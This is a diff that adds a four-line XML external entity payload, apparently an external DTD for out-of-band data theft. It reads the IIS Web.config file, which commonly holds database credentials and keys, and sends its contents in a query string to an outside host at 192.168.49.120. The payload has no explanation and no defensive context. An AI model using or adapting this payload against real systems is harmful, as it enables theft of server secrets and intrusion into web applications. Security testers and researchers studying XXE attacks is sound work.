@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/Web.config">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.49.120/?x=%file'>">
+%eval;
+%exfiltrate;
